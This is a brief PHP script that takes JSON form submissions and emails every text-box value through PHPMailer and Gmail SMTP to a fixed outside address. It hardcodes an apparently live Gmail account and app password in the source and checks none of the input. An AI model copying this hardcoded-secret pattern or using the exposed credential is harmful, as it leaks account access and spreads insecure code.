<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $formData = json_decode(file_get_contents("php://input"), true);

    $mail = new PHPMailer(true);

    try {
        //Server settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'babypay73@gmail.com';
        $mail->Password   = 'myfu kzmj vyam laad';
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;

        //Recipients
        $mail->setFrom('babypay73@gmail.com', 'Your Name');
        $mail->addAddress('yawbaby73@gmail.com');

        // Content
        $mail->isHTML(false);
        $mail->Subject = 'Data from website text boxes';
        $mail->Body    = implode("\n", $formData['formData']);

        $mail->send();
        echo 'Information sent successfully!';
    } catch (Exception $e) {
        echo "Error sending information: {$mail->ErrorInfo}";
    }
}
?>
